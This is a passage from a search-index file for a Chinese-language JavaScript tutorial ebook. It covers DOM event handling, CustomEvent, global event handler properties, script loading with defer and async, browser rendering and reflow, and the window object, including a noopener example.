world!&lt;/b&gt;');\n  e.preventDefault();\n});\n// \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u590d\u5236\u8fdb\u53bb\u526a\u5207\u677f\u7684\u662f\u5f00\u53d1\u8005\u56fa\u5b9a\u7684\u5185\u5bb9\uff0c\u4e0d\u662f\u754c\u9762\u7684\u5185\u5bb9\u3002\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#13","title":"13\u3001\u7126\u70b9\u4e8b\u4ef6","text":"<p>focusin -&gt; focus -&gt; focusout -&gt; blur</p> <p>\u8fd9\u51e0\u4e2a\u4e8b\u4ef6\u4e0d\u4f1a\u5192\u6ce1\uff0c\u6240\u4ee5\u9700\u8981\u5728\u4e8b\u4ef6\u6355\u83b7\u9636\u6bb5\uff08addEventListener true\uff09\u5904\u7406</p>"},{"location":"ebook-JS-basic/09-Event/#14customevent","title":"14\u3001CustomEvent","text":"<p>\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u4e8b\u4ef6\u5b9e\u4f8b</p> <pre><code>let e = new CustomEvent(type, options);\n\noptions = {\n  detail: 'tell me info'\n};\n\ne.detail === 'tell me info'\n</code></pre> <p>eg2</p> <pre><code>var myEvent = new CustomEvent('myevent', {\n  detail: { foo: 'bar'},\n  bubbles: true,\n  cancelable: false\n});\n\nel.addEventListener('myevent', function (event) {\n  console.log('Hello ' + event.detail.foo);\n});\n\nel.dispatchEvent(myEvent);\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#911-api","title":"9.11 \u5168\u5c40\u4e8b\u4ef6\u5904\u7406API","text":"<p>\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u6709\u4e24\u79cd\u5199\u6cd5\uff0caddEventListener(type, function, true) \u6216\u8005 onClick = function() {}</p> <p>\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u7b80\u5355\u4f7f\u7528\u65b9\u4fbf\uff0c\u4e0d\u80fd\u4e0a\u8bbe\u7f6e\u6355\u83b7\u6216\u8005\u5192\u6ce1\u3002\u7531 GlobalEventHandlers \u63d0\u4f9b\u3002\u4e0b\u9762\u662f\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u5c5e\u6027</p> <p>1\u3001onabort \u4e8b\u4ef6\u505c\u6b62\u53d1\u751f\u89e6\u53d1</p> <pre><code>&lt;img src=\"example.jpg\" id=\"img\"/&gt;\n\nvar img = document.getElementById('img');\nimg.onabort = function () {\n  console.log('image load aborted.');\n}\n</code></pre> <p>2\u3001onerror \u9519\u8bef\u65f6\u89e6\u53d1\u4e8b\u4ef6</p> <p>\u5f53JS\u9519\u8bef\u65f6\uff0c\u4f1a\u4f20\u5230 window.onerror</p> <pre><code>window.onerror = function(message, source, lineno, colno, error) {\n  message\uff1a\u9519\u8bef\u4fe1\u606f\u5b57\u7b26\u4e32\n  source\uff1a\u62a5\u9519\u811a\u672c\u7684 URL\n  lineno\uff1a\u62a5\u9519\u7684\u884c\u53f7\uff0c\u662f\u4e00\u4e2a\u6574\u6570\n  colno\uff1a\u62a5\u9519\u7684\u5217\u53f7\uff0c\u662f\u4e00\u4e2a\u6574\u6570\n  error\uff1a \u9519\u8bef\u5bf9\u8c61\n}\n</code></pre> <p>\u8d44\u6e90\u52a0\u8f7d\u9519\u8bef\uff08\u56fe\u7247\u6216\u8005\u811a\u672c\u9519\u8bef\uff09error\u4f1a\u5728\u5f53\u524d\u5143\u7d20\u89e6\u53d1\uff0c\u901a\u5e38\u4e0d\u4f1a\u89e6\u53d1window.onerror</p> <p>3\u3001onload  onloadstart</p> <p>window img \u4f1a\u5728\u52a0\u8f7d\u5b8c\u6bd5\u540e\u89e6\u53d1 onload</p> <p>img video \u5728\u52a0\u8f7d\u5f00\u59cb\u65f6\uff0c\u8fd8\u4f1a\u89e6\u53d1 onloadstart \u4e8b\u4ef6</p> <p>4\u3001onfocsu onblur</p> <p>\u83b7\u5f97\u6216\u8005\u5931\u53bb\u7126\u70b9</p> <p>5\u3001onscroll</p> <p>\u9875\u9762\u6216\u8005\u5143\u7d20\u6eda\u52a8\uff08\u6ce8\u610f\u8282\u6d41\uff09</p> <p>6\u3001oncontextmenu onshow</p> <p>\u5143\u7d20\u4e0a\u70b9\u51fb\u53f3\u952e\uff0c\u4f1a\u89e6\u53d1 oncontextmenu\uff0c\u5982\u679c\u8fd4\u56detrue\u5c31\u663e\u793a\u53f3\u952e\u83dc\u5355\uff0c\u5982\u679c\u8fd4\u56defalse\u5c31\u4e0d\u663e\u793a\u53f3\u952e\u83dc\u5355\u3002</p> <p>\u663e\u793a\u53f3\u952e\u83dc\u5355\u65f6\uff0c\u4f1a\u89e6\u53d1 onshow \u4e8b\u4ef6\u3002</p> <p>7\u3001\u5176\u4ed6</p> <p>\u9f20\u6807\u7684\u4e8b\u4ef6\u5c5e\u6027</p> <pre><code>onclick\nondblclick\nonmousedown\nonmouseenter\nonmouseleave\nonmousemove\nonmouseout\nonmouseover\nonmouseup\nonwheel\n\n\u952e\u76d8\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002\nonkeydown\nonkeypress\nonkeyup\n\n\u7126\u70b9\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002\nonblur\nonfocus\n\n\u8868\u5355\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002\noninput\nonchange\nonsubmit\nonreset\noninvalid\nonselect\n\n\u89e6\u6478\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002\nontouchcancel\nontouchend\nontouchmove\nontouchstart\n\n- \u62d6\u52a8\u7684\u4e8b\u4ef6\u5c5e\u6027\u5206\u6210\u4e24\u7c7b\uff1a\u4e00\u7c7b\u4e0e\u88ab\u62d6\u52a8\u5143\u7d20\u76f8\u5173\uff0c\u53e6\u4e00\u7c7b\u4e0e\u63a5\u6536\u88ab\u62d6\u52a8\u5143\u7d20\u7684\u5bb9\u5668\u5143\u7d20\u76f8\u5173\u3002\n\n\u88ab\u62d6\u52a8\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002\nondragstart\uff1a\u62d6\u52a8\u5f00\u59cb\nondrag\uff1a\u62d6\u52a8\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u9694\u51e0\u767e\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21\nondragend\uff1a\u62d6\u52a8\u7ed3\u675f\n\n\u63a5\u6536\u88ab\u62d6\u52a8\u5143\u7d20\u7684\u5bb9\u5668\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002\nondragenter\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u8fdb\u5165\u5bb9\u5668\u5143\u7d20\u3002\nondragleave\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u79bb\u5f00\u5bb9\u5668\u5143\u7d20\u3002\nondragover\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u5728\u5bb9\u5668\u5143\u7d20\u4e0a\u65b9\uff0c\u6bcf\u9694\u51e0\u767e\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21\u3002\nondrop\uff1a\u677e\u5f00\u9f20\u6807\u540e\uff0c\u88ab\u62d6\u52a8\u5143\u7d20\u653e\u5165\u5bb9\u5668\u5143\u7d20\u3002\n\n&lt;dialog&gt;\u5bf9\u8bdd\u6846\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002\noncancel\nonclose\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/","title":"10-1-BOM","text":""},{"location":"ebook-JS-basic/10-1-BOM/#bom","title":"\u7b2c\u5341\u7ae0 BOM","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 34511  \u9605\u8bfb70\u5206\u949f</p> <p>2021-11-24 2023-04-11</p>"},{"location":"ebook-JS-basic/10-1-BOM/#101-bom","title":"10.1 BOM\u57fa\u672c\u539f\u7406","text":""},{"location":"ebook-JS-basic/10-1-BOM/#_1","title":"\u6982\u5ff5","text":"<p>JS \u4ee3\u7801\u5d4c\u5165\u7f51\u9875\u6709\u56db\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>script \u5d4c\u5165\u5185\u90e8\u4ee3\u7801\uff0ctype = 'text/javascript' \u8bf4\u660e\u811a\u672c\u7684\u7c7b\u578b\u3002\u65e9\u671f\u6d4f\u89c8\u5668\u4f7f\u7528 'text/javascript' \u65b0\u6d4f\u89c8\u5668\u63a8\u8350\u4f7f\u7528 'application/javascript'\u3002\u5982\u679c\u662f\u5176\u4ed6\u53c2\u6570\uff0c\u811a\u672c\u4e0d\u4f1a\u6267\u884c\uff08\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4f20\u5165\u5176\u4ed6\u4fe1\u606f\uff0c\u4f7f\u7528DOM\u65b9\u6cd5\u83b7\u53d6\u811a\u672c\u5185\u5bb9\uff09</li> <li>script \u5d4c\u5165\u5916\u90e8\u4ee3\u7801\uff0c\u8bbe\u7f6e src \u5c5e\u6027\u662f\u5916\u90e8\u7684JS\u4ee3\u7801\u3002\u5982\u679c\u5185\u90e8\u5916\u90e8\u540c\u65f6\u4f7f\u7528\uff0c\u5185\u90e8\u4ee3\u7801\u4e0d\u4f1a\u751f\u6548\u3002script \u811a\u672c\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a integrity \u5c5e\u6027\uff0c\u5199\u5165\u811a\u672c\u7684\u54c8\u5e0c\u7b7e\u540d\uff0c\u9a8c\u8bc1\u5916\u90e8\u811a\u672c\u7684\u4e00\u81f4\u6027\uff0c\u907f\u514d\u5916\u90e8\u811a\u672c\u7be1\u6539\u3002</li> <li>HTML \u884c\u5185\u4ee3\u7801\uff1a\u4e8b\u4ef6\u89e6\u53d1\u540e\u53ef\u4ee5\u6267\u884c\u811a\u672c <code>onclick='console.log('click');'</code></li> <li>A \u5185\u90e8\uff1a<code>&lt;a href=\"javascript:console.log('Hello')\"&gt;\u70b9\u51fb&lt;/a&gt;</code> \u5982\u679c JavaScript \u4ee3\u7801\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u65b0\u5efa\u4e00\u4e2a\u6587\u6863\uff0c\u5c55\u793a\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\uff0c\u539f\u6709\u6587\u6863\u7684\u5185\u5bb9\u90fd\u4f1a\u6d88\u5931\u3002</li> </ul> <p>\u811a\u672c\u6267\u884c\u539f\u7406\uff1a</p> <ul> <li>\u6d4f\u89c8\u5668\u4e0b\u8f7dHTML\uff0c\u4e0b\u8f7d\u5e76\u5f00\u59cb\u89e3\u6790</li> <li>\u9047\u5230 JS \u4ee3\u7801\uff0c\u505c\u6b62HTML\u89e3\u6790\uff1b\u5f00\u59cbJS\u89e3\u6790\uff1b\u5982\u679c\u662f\u5916\u90e8JS\u4ee3\u7801\uff0c\u9700\u8981\u4e0b\u8f7d\u5b8c\u6bd5\u540e\u89e3\u6790JS\u3002\u5982\u679c\u4e0b\u8f7d\u65f6\u95f4\u8f83\u957f\uff0c\u4f1a\u4ea7\u751f\u963b\u585e\u3002\u6240\u4ee5\u901a\u5e38\u628aJS\u811a\u672c\u653e\u5728\u9875\u9762\u5e95\u90e8\u3002\u5982\u679c\u5728\u5934\u90e8\u52a0\u8f7d\uff0cDOM\u6ca1\u6709\u6e32\u67d3\uff0c\u53ef\u80fdJS\u51fa\u9519</li> <li>\u89e3\u6790JS\u5b8c\u6bd5\u540e\uff0c\u7ee7\u7eed\u89e3\u6790HTML\u754c\u9762</li> </ul> <p>\u6d4f\u89c8\u5668\u5bf9\u4e8e\u540c\u4e00\u4e2a\u57df\u540d\u4e0b\u7684\u8d44\u6e90\u6570\u91cf\u6709\u9650\u5236\uff0c\u4e3a\u4e86\u907f\u514d\u670d\u52a1\u5668\u8bf7\u6c42\u8fc7\u591a\uff1b\u5982\u679c\u8d44\u6e90\u5f88\u591a\uff0c\u53ef\u4ee5\u653e\u5728\u4e0d\u540c\u7684\u57df\u540d\u4e0b\u3002</p>"},{"location":"ebook-JS-basic/10-1-BOM/#defer","title":"defer \u5c5e\u6027","text":"<p>\u5916\u90e8\u7684\u811a\u672c\uff0c\u5982\u679c\u6dfb\u52a0\u4e86defer\u5c5e\u6027\uff0c\u5c31\u4f1a\u5728HTML\u4e0b\u8f7d\u89e3\u6790\u7ed3\u675f\u540e\u518d\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002\u6d4f\u89c8\u5668\u89e3\u6790HTML\u548c\u4e0b\u8f7d\u811a\u672c\u8fc7\u7a0b\u662f\u5e76\u884c\u7684\uff0c\u8fd9\u6837\u4f1a\u907f\u514d\u963b\u585e\u3002</p>"},{"location":"ebook-JS-basic/10-1-BOM/#async","title":"async \u5c5e\u6027","text":"<p>\u6d4f\u89c8\u5668\u9047\u5230async\u5c5e\u6027\u7684\u811a\u672c\uff0c\u4f1a\u4f7f\u7528\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u4e0b\u8f7d\u811a\u672c\uff0c\u4e0b\u8f7d\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u9020\u6210\u963b\u585e\u3002\u4e0b\u8f7dJS\u4efb\u52a1\u548c\u89e3\u6790HTML\u662f\u5e76\u884c\u7684\u3002\u5f53\u811a\u672c\u4e0b\u8f7d\u5b8c\u6bd5\uff0c\u6682\u505cDOM\u6e32\u67d3\uff0c\u6267\u884cJS\u811a\u672c\u3002\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u7ee7\u7eed\u754c\u9762\u7684DOM\u6e32\u67d3\u3002\u6ce8\u610f\uff1a\u5982\u679c\u591a\u811a\u672c\u5f02\u6b65\u4e0b\u8f7d\uff0c\u5148\u4e0b\u8f7d\u7684\u811a\u672c\u4f1a\u5148\u6267\u884c\u3002</p> <p>defer \u548c async \u4f7f\u7528\uff1a\u5982\u679c\u811a\u672c\u95f4\u6709\u8f83\u5f3a\u7684\u4f9d\u8d56\u6027\uff08babel react\uff09\u9700\u8981\u4f7f\u7528defer\uff08\u8bbe\u7f6easync\u5c5e\u6027\u662ffalse\uff09\uff0c\u5982\u679c\u811a\u672c\u95f4\u6ca1\u6709\u4f9d\u8d56\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528 async\u3002</p>"},{"location":"ebook-JS-basic/10-1-BOM/#_2","title":"\u52a0\u8f7d\u534f\u8bae","text":"<p>\u9ed8\u8ba4\u534f\u8bae\u662fHTTP\u534f\u8bae\uff0c\u53ef\u4ee5\u5728Scr\u5c5e\u6027\u4e2d\u8bbe\u7f6e\u5176\u4ed6\u534f\u8bae\u4e0b\u8f7d\uff0c\u6216\u8005\u6839\u636e\u754c\u9762\u81ea\u8eab\u7684\u534f\u8bae\u4e0b\u8f7d\u3002</p> <pre><code>&lt;script src=\"https://test.js\"&gt;&lt;/script&gt;\n&lt;script src=\"//example.js\"&gt;&lt;/script&gt;\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#_3","title":"\u6d4f\u89c8\u5668\u7ec4\u6210","text":"<p>\u6d4f\u89c8\u5668\u6709DOM\u6e32\u67d3\u5f15\u64ce\u548cJS\u89e3\u91ca\u5668\uff08JS\u5f15\u64ce\uff09\u7ec4\u6210</p> <p>\u6e32\u67d3\u5f15\u64ce\uff1aFirefox\uff1aGecko\uff1bSafari\uff1aWebKit \uff1bChrome\uff1aBlink \uff1bIE: Trident \uff1bEdge: EdgeHTML</p> <p>\u6e32\u67d3\u5f15\u64ce\u5de5\u4f5c\u6d41\u7a0b\uff1aHTML\u89e3\u6790\u6210DOM\uff0cCSS\u89e3\u6790\u6210CSSOM\uff08object model\uff09\uff0c\u5c06\u8fd9\u4e24\u90e8\u5206\u5408\u6210\u6e32\u67d3\u6811\uff08render tree\uff09\uff0c\u8ba1\u7b97\u6e32\u67d3\u6811\u7684\u5e03\u5c40\uff08layout\uff09\uff0c\u5c06\u6e32\u67d3\u6811\u7ed8\u5236\u5230\u5c4f\u5e55\u3002\u8fd9\u51e0\u90e8\u5206\u4e0d\u662f\u5b8c\u5168\u5148\u540e\u6267\u884c\u7684\uff0c\u53ef\u80fd\u4e00\u90e8\u5206\u5df2\u7ecf\u6e32\u67d3\uff0c\u53e6\u4e00\u90e8\u5206HTML\u8fd8\u5728\u4e0b\u8f7d</p>"},{"location":"ebook-JS-basic/10-1-BOM/#_4","title":"\u91cd\u7ed8\u548c\u91cd\u6d41","text":"<p>\u5e03\u5c40\uff08\u5e03\u5c40\u6d41\uff0cflow\uff09\u548c\u7ed8\u5236\uff08paint\uff09\uff1a\u6e32\u67d3\u6811\u8f6c\u5316\u6210\u7f51\u9875\u5e03\u5c40\uff08layout\uff09\u7684\u8fc7\u7a0b\u53eb\u5e03\u5c40\uff0c\u7f51\u9875\u5e03\u5c40\uff08layout\uff09\u8f6c\u5316\u6210\u5c4f\u5e55\u663e\u793a\u53eb\u7ed8\u5236\u3002\u8fd9\u4e24\u90e8\u5206\u4f1a\u963b\u585e\u5e76\u4e14\u6d88\u8017\u6027\u80fd\u3002</p> <p>\u91cd\u7ed8\u548c\u91cd\u6d41\uff1a\u9875\u9762\u9996\u6b21\u751f\u6210\u540e\uff0c\u64cd\u4f5c\u811a\u672c\u548c\u6837\u5f0f\u8868\u4f1a\u9020\u6210\u754c\u9762\u7684\u91cd\u6d41\u6216\u91cd\u7ed8\u3002\u91cd\u6d41\u5fc5\u7136\u9020\u6210\u91cd\u7ed8\uff0c\u91cd\u7ed8\u4e0d\u4f1a\u9020\u6210\u91cd\u6d41\u3002\u5982\u679c\u6539\u53d8\u6587\u5b57\u989c\u8272\uff0c\u9875\u9762\u7684\u5e03\u5c40\u4e0d\u4f1a\u6539\uff0c\u6240\u4ee5\u4e0d\u4f1a\u91cd\u6d41\uff0c\u53ea\u4f1a\u91cd\u7ed8\u3002\u5982\u679c\u6539\u53d8\u6587\u672c\u5185\u5bb9\uff0c\u754c\u9762\u5e03\u5c40\u4f1a\u6539\u53d8\uff0c\u4f1a\u91cd\u6d41\u91cd\u7ed8\u3002\u6d4f\u89c8\u5668\u4f1a\u5bf9\u6bd4\u6539\u53d8\u524d\u540e\u7684\u6e32\u67d3\u6811\u7684\u5dee\u522b\uff0c\u8ba1\u7b97\u51fa\u53d8\u5316\u7684\u90e8\u5206diff\uff0c\u4e0d\u4f1a\u91cd\u65b0\u52a0\u8f7d\u6574\u4e2a\u7f51\u9875\uff0c\u53ea\u6e32\u67d3\u4e00\u90e8\u5206\u5b50\u6811\u3002\u5f00\u53d1\u4e2d\u5c3d\u91cf\u51cf\u5c11\u91cd\u6d41\u548c\u91cd\u7ed8\uff0c\u5c3d\u91cf\u4e0d\u8981\u6539\u53d8\u9876\u5c42\u7684DOM\u8282\u70b9\uff0ctable\u5e03\u5c40\u548cflex\u5e03\u5c40\u4f1a\u6d88\u8017\u6027\u80fd\u3002</p>"},{"location":"ebook-JS-basic/10-1-BOM/#_5","title":"\u6027\u80fd\u4f18\u5316","text":"<ul> <li> <p>\u8bfb\u53d6 DOM \u6216\u8005\u5199\u5165 DOM\uff0c\u5c3d\u91cf\u5199\u5728\u4e00\u8d77\uff0c\u4e0d\u8981\u6df7\u6742\u3002\u4e0d\u8981\u8bfb\u53d6\u4e00\u4e2a DOM \u8282\u70b9\uff0c\u7136\u540e\u7acb\u523b\u5199\u5165\uff0c\u63a5\u7740\u518d\u8bfb\u53d6\u4e00\u4e2a DOM \u8282\u70b9\u3002\u4f7f\u7528<code>documentFragment</code>\u64cd\u4f5c DOM\uff0c\u4f7f\u7528\u865a\u62df DOM\uff08virtual DOM\uff09\u5e93\u3002\u7f13\u5b58 DOM \u4fe1\u606f\u3002</p> </li> <li> <p>\u4e0d\u8981\u4e00\u9879\u4e00\u9879\u5730\u6539\u53d8\u6837\u5f0f\uff0c\u800c\u662f\u4f7f\u7528 CSS class \u4e00\u6b21\u6027\u6539\u53d8\u6837\u5f0f\u3002\u52a8\u753b\u4f7f\u7528<code>absolute</code>\u5b9a\u4f4d\u6216<code>fixed</code>\u5b9a\u4f4d\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5bf9\u5176\u4ed6\u5143\u7d20\u7684\u5f71\u54cd\u3002\u53ea\u5728\u5fc5\u8981\u65f6\u624d\u663e\u793a\u9690\u85cf\u5143\u7d20\u3002</p> </li> <li> <p>\u4f7f\u7528<code>window.requestAnimationFrame()</code>\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u628a\u4ee3\u7801\u63a8\u8fdf\u5230\u4e0b\u4e00\u6b21\u91cd\u6d41\u65f6\u6267\u884c\uff0c\u800c\u4e0d\u662f\u7acb\u5373\u8981\u6c42\u9875\u9762\u91cd\u6d41\u3002</p> </li> </ul> <pre><code>function doubleHeight(ele) {\n  let currentHeight = ele.clientHeight;\n  window.requestAnimationFrame(() =&gt; {\n    // \u53ef\u4ee5\u628a\u4ee3\u7801\u6240\u6709\u7684\u5199\u64cd\u4f5c\u51e0\u79cd\u5230\u4e00\u8d77\uff0c\u8fd9\u6837\u4f1a\u51cf\u5c11DOM\u53d8\u52a8\u7684\u5f00\u9500\uff0c\u91cd\u7ed8\u4ee3\u4ef7\u5c11\n    ele.style.height = (currentHeight * 2) + 'px';\n  });\n}\n\nelements.forEach(doubleHeight);\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#js","title":"JS \u5f15\u64ce","text":"<p>JS\u662f\u89e3\u6790\u578b\u8bed\u8a00\u3002\u65e9\u671f\u6d4f\u89c8\u5668\u5185\u90e8\u5bf9 JavaScript \u7684\u5904\u7406\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u8bfb\u53d6\u4ee3\u7801\uff0c\u8fdb\u884c\u8bcd\u6cd5\u5206\u6790\uff08Lexical analysis\uff09\uff0c\u5c06\u4ee3\u7801\u5206\u89e3\u6210\u8bcd\u5143\uff08token\uff09\u3002</li> <li>\u5bf9\u8bcd\u5143\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff08parsing\uff09\uff0c\u5c06\u4ee3\u7801\u6574\u7406\u6210\u201c\u8bed\u6cd5\u6811\u201d\uff08syntax tree\uff09\u3002</li> <li>\u4f7f\u7528\u201c\u7ffb\u8bd1\u5668\u201d\uff08translator\uff09\uff0c\u5c06\u4ee3\u7801\u8f6c\u4e3a\u5b57\u8282\u7801\uff08bytecode\uff09\u3002</li> <li>\u4f7f\u7528\u201c\u5b57\u8282\u7801\u89e3\u91ca\u5668\u201d\uff08bytecode interpreter\uff09\uff0c\u5c06\u5b57\u8282\u7801\u8f6c\u4e3a\u673a\u5668\u7801\u3002</li> </ol> <p>\u9010\u884c\u89e3\u91ca\u5c06\u5b57\u8282\u7801\u8f6c\u4e3a\u673a\u5668\u7801\uff0c\u662f\u5f88\u4f4e\u6548\u7684\u3002\u4e3a\u4e86\u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6\uff0c\u73b0\u4ee3\u6d4f\u89c8\u5668\u6539\u4e3a\u91c7\u7528\u201c\u5373\u65f6\u7f16\u8bd1\u201d\uff08Just In Time compiler\uff0c\u7f29\u5199 JIT\uff09\uff0c\u5373\u5b57\u8282\u7801\u53ea\u5728\u8fd0\u884c\u65f6\u7f16\u8bd1\uff0c\u7528\u5230\u54ea\u4e00\u884c\u5c31\u7f16\u8bd1\u54ea\u4e00\u884c\uff0c\u5e76\u4e14\u628a\u7f16\u8bd1\u7ed3\u679c\u7f13\u5b58\uff08inline cache\uff09\u3002\u901a\u5e38\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u88ab\u7ecf\u5e38\u7528\u5230\u7684\uff0c\u53ea\u662f\u5176\u4e2d\u4e00\u5c0f\u90e8\u5206\u4ee3\u7801\uff0c\u6709\u4e86\u7f13\u5b58\u7684\u7f16\u8bd1\u7ed3\u679c\uff0c\u6574\u4e2a\u7a0b\u5e8f\u7684\u8fd0\u884c\u901f\u5ea6\u5c31\u4f1a\u663e\u8457\u63d0\u5347\u3002</p> <p>\u5b57\u8282\u7801\u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c\uff0c\u800c\u662f\u8fd0\u884c\u5728\u4e00\u4e2a\u865a\u62df\u673a\uff08Virtual Machine\uff09\u4e4b\u4e0a\uff0c\u4e00\u822c\u4e5f\u628a\u865a\u62df\u673a\u79f0\u4e3a JavaScript \u5f15\u64ce\u3002\u5e76\u975e\u6240\u6709\u7684 JavaScript \u865a\u62df\u673a\u8fd0\u884c\u65f6\u90fd\u6709\u5b57\u8282\u7801\uff0c\u6709\u7684 JavaScript \u865a\u62df\u673a\u57fa\u4e8e\u6e90\u7801\uff0c\u5373\u53ea\u8981\u6709\u53ef\u80fd\uff0c\u5c31\u901a\u8fc7 JIT\uff08just in time\uff09\u7f16\u8bd1\u5668\u76f4\u63a5\u628a\u6e90\u7801\u7f16\u8bd1\u6210\u673a\u5668\u7801\u8fd0\u884c\uff0c\u7701\u7565\u5b57\u8282\u7801\u6b65\u9aa4\u3002\u8fd9\u4e00\u70b9\u4e0e\u5176\u4ed6\u91c7\u7528\u865a\u62df\u673a\uff08\u6bd4\u5982 Java\uff09\u7684\u8bed\u8a00\u4e0d\u5c3d\u76f8\u540c\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u5c3d\u53ef\u80fd\u5730\u4f18\u5316\u4ee3\u7801\u3001\u63d0\u9ad8\u6027\u80fd\u3002\u4e0b\u9762\u662f\u76ee\u524d\u6700\u5e38\u89c1\u7684\u4e00\u4e9b JavaScript \u865a\u62df\u673a\uff1a V8 (Chrome, Chromium)</p>"},{"location":"ebook-JS-basic/10-1-BOM/#102-window","title":"10.2 window \u5bf9\u8c61","text":"<p>window\u5bf9\u8c61\u548cJS\u4e2d\u666e\u901a\u5bf9\u8c61\u7c7b\u4f3c\uff0c\u5177\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u4e5f\u4f1a\u89e6\u53d1\u4e8b\u4ef6\u3002</p> <p>window\u5bf9\u8c61\u662f\u5f53\u524d\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u9876\u5c42\u5bf9\u8c61\u3002\u5982\u679c\u4e00\u4e2a\u6ca1\u6709\u58f0\u660e\u7684\u53d8\u91cf\u76f4\u63a5\u4f7f\u7528\uff0c\u5c31\u4f1a\u81ea\u52a8\u8f6c\u5316\u6210\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\uff08window\u7684\u5c5e\u6027\uff09\u3002</p>"},{"location":"ebook-JS-basic/10-1-BOM/#_6","title":"\u5c5e\u6027","text":"<p>\u5e38\u89c4\u5c5e\u6027</p> <ul> <li>window.name \u8868\u793a\u5f53\u524d\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u540d\u5b57\uff08\u5b57\u7b26\u4e32\uff0c\u5bb9\u91cf\u53ef\u4ee5\u9ad8\u8fbe\u51e0MB\uff09\uff1b\u53ea\u8981\u6d4f\u89c8\u5668\u7a97\u53e3\u4e0d\u5173\u95ed\uff0c\u8df3\u8f6c\u53e6\u4e00\u4e2a\u9875\u9762\uff08\u6216\u8005\u5237\u65b0\u5f53\u524d\u7a97\u53e3\uff09\uff0c\u524d\u4e00\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\u540d\u5b57\u8bbe\u7f6e\u4e0d\u4f1a\u53d8\u5316\u3002</li> <li>window.closed \u5224\u65ad\u7a97\u53e3\u662f\u5426\u5173\u95ed(\u53ef\u4ee5\u76d1\u6d4b\u4f7f\u7528\u811a\u672c\u6253\u5f00\u7684\u65b0\u7a97\u53e3\u662f\u5426\u5173\u95ed)</li> <li>window.opener \u5c5e\u6027\u8868\u793a\u6253\u5f00\u5f53\u524d\u7a97\u53e3\u7684\u7236\u7a97\u53e3 \u5982\u679c\u6ca1\u6709\u7236\u7a97\u53e3\uff0c\u5c31\u8fd4\u56de null\u3002\u5982\u679c\u4e24\u4e2a\u7a97\u53e3\u4e0d\u9700\u8981\u901a\u4fe1\uff0c\u5c31\u8bbe\u7f6e\u5b50\u7a97\u53e3 window.opener === null \u8fd9\u6837\u53ef\u4ee5\u5207\u65ad\u7236\u7a97\u53e3\u7684\u8054\u7cfb\u3002\u5143\u7d20\u6dfb\u52a0rel=\"noopener\"\u5c5e\u6027\uff0c\u53ef\u4ee5\u9632\u6b62\u65b0\u6253\u5f00\u7684\u7a97\u53e3\u83b7\u53d6\u7236\u7a97\u53e3\uff0c\u51cf\u8f7b\u88ab\u6076\u610f\u7f51\u7ad9\u4fee\u6539\u7236\u7a97\u53e3 URL \u7684\u98ce\u9669\u3002 <li>window.self </li> <li>window.window \u6307\u5411\u672c\u8eab</li> <li>window.status \u8bfb\u53d6\u6d4f\u89c8\u5668\u72b6\u6001\u680f\u7684\u6587\u672c(\u517c\u5bb9\u65e9\u671f\u6d4f\u89c8\u5668)</li> <pre><code>&lt;a href=\"https://an.evil.site\" target=\"_blank\" rel=\"noopener\"&gt;&lt;/a&gt;\n</code></pre> <p>\u6846\u67b6\u7684\u5c5e\u6027</p> <ul> <li>window.frames \u8fd4\u56de\u5f53\u524d\u9875\u9762\u5185\u6240\u6709\u7684\u6846\u67b6\u7a97\u53e3(\u4f2a\u6570\u7ec4) \u5305\u62ec frame iframe</li> <li>window.length \u8fd4\u56de\u6846\u67b6\u7a97\u53e3\u7684\u6570\u91cf</li> <li>window.frameElement 